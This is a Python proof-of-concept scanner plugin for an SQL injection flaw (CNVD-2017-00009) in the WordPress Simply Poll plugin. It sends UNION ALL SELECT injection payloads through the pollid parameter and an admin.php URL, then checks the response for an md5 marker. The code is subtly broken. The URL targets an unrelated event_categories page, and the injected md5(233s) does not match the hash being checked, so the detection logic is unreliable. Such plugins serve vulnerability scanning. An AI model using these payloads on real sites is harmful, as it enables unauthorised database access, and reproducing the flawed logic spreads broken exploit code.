# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CNVD-2017-00009' # 平台漏洞编号
    name = 'WordPress插件Simply Poll SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类
    disclosure_date = '2017-01-03'  # 漏洞公布时间
    desc = '''
    WordPress插件Simply Poll admin-ajax.php页面的pollid参数存在SQL注入漏洞。由于程序未能充分过滤用户提交的输入，攻击者可以通过该漏洞控制应用程序，访问或修改数据，或利用底层数据库中潜在的漏洞。
    ''' # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-00009' #
    cnvd_id = 'CNVD-2017-00009' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = 'WordPress Simply Poll 1.4.1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '0c2319ff-52e4-4e7b-b265-a7162347fc9d' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/wp-admin/admin.php?page=event_categories&action=edit&id=-7749 UNION ALL SELECT 22,22,22,md5(233),22,22,22#"
            vul_url = arg + payload
            headers = {
                'Content-Type':'application/x-www-form-urlencoded',
                'Cookie':self.get_option('cookie')
            }
            data='action=spAjaxResults&pollid=-7159 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(md5(233s)),NULL--CfNO'
            response = requests.post(vul_url,headers=headers,data=data)
            if response.status_code ==200 and 'e165421110ba03099a1c0393373c5b43' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()